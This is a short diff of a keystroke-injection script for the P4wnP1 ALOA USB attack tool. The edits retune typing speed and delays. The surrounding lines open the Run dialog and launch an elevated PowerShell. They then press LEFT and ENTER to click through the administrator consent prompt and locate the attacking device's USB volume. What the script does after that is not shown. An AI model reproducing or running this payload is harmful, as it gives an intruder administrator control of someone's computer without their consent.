@@ -1,7 +1,7 @@
 
 layout("US"); //set US layout
 
-typingSpeed(25,0);
+typingSpeed(0,0);
 press("GUI r")
 delay(1000)
 type("cmd")
@@ -40,15 +40,15 @@ press("ENTER")
 delay(1000)
 press("GUI r")
 press("ENTER")
-delay(1000)
+delay(1200)
 type("powershell")
-delay(500)
+delay(1000)
 press("CTRL SHIFT ENTER")
 delay(1200)
 press("LEFT")
-delay(500)
+delay(750)
 press("ENTER")
-delay(500)
+delay(750)
 type("cd $home\n")
 delay(500)
 type("$usbpath = Get-WMIObject Win32_Volume | ? { $_.Label -eq \'P4wnP1 ALOA\' } | select name \n")
